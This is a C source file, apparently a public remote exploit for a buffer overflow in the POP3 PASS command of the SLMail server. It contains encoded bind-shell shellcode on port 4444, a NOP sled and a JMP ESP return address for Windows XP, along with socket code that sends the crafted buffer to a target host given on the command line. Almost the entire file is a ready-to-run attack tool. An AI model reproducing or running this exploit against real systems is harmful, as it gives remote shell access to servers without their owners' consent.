#include <string.h>
#include <stdio.h>
#include <winsock2.h>
#include <windows.h>

// [*] bind 4444 
unsigned char shellcode[] =
"\xd9\xcf\xd9\x74\x24\xf4\xbb\xf1\x95\xc8\x36\x5a\x29\xc9\xb1"
"\x52\x31\x5a\x17\x83\xc2\x04\x03\xab\x86\x2a\xc3\xb7\x41\x28"
"\x2c\x47\x92\x4d\xa4\xa2\xa3\x4d\xd2\xa7\x94\x7d\x90\xe5\x18"
"\xf5\xf4\x1d\xaa\x7b\xd1\x12\x1b\x31\x07\x1d\x9c\x6a\x7b\x3c"
"\x1e\x71\xa8\x9e\x1f\xba\xbd\xdf\x58\xa7\x4c\x8d\x31\xa3\xe3"
"\x21\x35\xf9\x3f\xca\x05\xef\x47\x2f\xdd\x0e\x69\xfe\x55\x49"
"\xa9\x01\xb9\xe1\xe0\x19\xde\xcc\xbb\x92\x14\xba\x3d\x72\x65"
"\x43\x91\xbb\x49\xb6\xeb\xfc\x6e\x29\x9e\xf4\x8c\xd4\x99\xc3"
"\xef\x02\x2f\xd7\x48\xc0\x97\x33\x68\x05\x41\xb0\x66\xe2\x05"
"\x9e\x6a\xf5\xca\x95\x97\x7e\xed\x79\x1e\xc4\xca\x5d\x7a\x9e"
"\x73\xc4\x26\x71\x8b\x16\x89\x2e\x29\x5d\x24\x3a\x40\x3c\x21"
"\x8f\x69\xbe\xb1\x87\xfa\xcd\x83\x08\x51\x59\xa8\xc1\x7f\x9e"
"\xcf\xfb\x38\x30\x2e\x04\x39\x19\xf5\x50\x69\x31\xdc\xd8\xe2"
"\xc1\xe1\x0c\xa4\x91\x4d\xff\x05\x41\x2e\xaf\xed\x8b\xa1\x90"
"\x0e\xb4\x6b\xb9\xa5\x4f\xfc\xcc\x32\x4f\x8b\xb8\x46\x4f\x72"
"\x82\xce\xa9\x1e\xe4\x86\x62\xb7\x9d\x82\xf8\x26\x61\x19\x85"
"\x69\xe9\xae\x7a\x27\x1a\xda\x68\xd0\xea\x91\xd2\x77\xf4\x0f"
"\x7a\x1b\x67\xd4\x7a\x52\x94\x43\x2d\x33\x6a\x9a\xbb\xa9\xd5"
"\x34\xd9\x33\x83\x7f\x59\xe8\x70\x81\x60\x7d\xcc\xa5\x72\xbb"
"\xcd\xe1\x26\x13\x98\xbf\x90\xd5\x72\x0e\x4a\x8c\x29\xd8\x1a"
"\x49\x02\xdb\x5c\x56\x4f\xad\x80\xe7\x26\xe8\xbf\xc8\xae\xfc"
"\xb8\x34\x4f\x02\x13\xfd\x7f\x49\x39\x54\xe8\x14\xa8\xe4\x75"
"\xa7\x07\x2a\x80\x24\xad\xd3\x77\x34\xc4\xd6\x3c\xf2\x35\xab"
"\x2d\x97\x39\x18\x4d\xb2";

void exploit(int sock) {
      FILE *test;
      char *ptr;
      char userbuf[] = "USER generaluser\r\n";
      char evil[3501];
      char buf[3501];
      char receive[1024];
      char nopsled[] = "\x90\x90\x90\x90\x90\x90\x90\x90"
                       "\x90\x90\x90\x90\x90\x90\x90\x90"
           "\x90\x90";
      memset(buf, 0x00, 3500);
      memset(evil, 0x00, 3500);
      memset(evil, 0x43, 3450);
      *(long*)&evil[2606] = 0x5f4a358f; // Windows is Big Endian?
      ptr = &evil[2610];
      memcpy(ptr, &nopsled, 16);
      ptr = &evil[2626];
      memcpy(ptr, &shellcode, 351);

      *(long*)&evil[2600] = 0x8f354a5f; // JMP ESP XP 7CB41020 FFE4 JMP ESP

      // banner
      recv(sock, receive, 200, 0);
      printf("[+] %s", receive);
      // user
      printf("[+] Sending Username...\n");
      send(sock, userbuf, strlen(userbuf), 0);
      recv(sock, receive, 200, 0);
      printf("[+] %s", receive);
      // passwd
      printf("[+] Sending Evil buffer...\n");
      sprintf(buf, "PASS %s\r\n", evil);
      send(sock, buf, strlen(buf), 0); // buf = 
      printf("[*] Done! Connect to the host on port 4444...\n\n");
}

int connect_target(char *host, u_short port)
{
    int sock = 0;
    struct hostent *hp;
    WSADATA wsa;
    struct sockaddr_in sa;

    WSAStartup(MAKEWORD(2,0), &wsa);
    memset(&sa, 0, sizeof(sa));

    hp = gethostbyname(host);
    if (hp == NULL) {
        printf("gethostbyname() error!\n"); exit(0);
    }
    printf("[+] Connecting to %s\n", host);
    sa.sin_family = AF_INET;
    sa.sin_port = htons(port);
    sa.sin_addr = **((struct in_addr **) hp->h_addr_list);

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0)      {
        printf("[-] socket blah?\n");
        exit(0);
        }
    if (connect(sock, (struct sockaddr *) &sa, sizeof(sa)) < 0)
        {printf("[-] connect() blah!\n");
        exit(0);
          }
    printf("[+] Connected to %s\n", host);
    return sock;
}


int main(int argc, char **argv)
{
    int sock = 0;
    int data, port;
    printf("\n[$] SLMail Server POP3 PASSWD Buffer Overflow exploit\n");
    printf("[$] by Mad Ivan [ void31337 team ] - http://exploit.void31337.ru\n\n");
    if ( argc < 2 ) { printf("usage: slmail-ex.exe <host> \n\n"); exit(0); }
    port = 110;
    sock = connect_target(argv[1], port);
    exploit(sock);
    closesocket(sock);
    return 0;
}
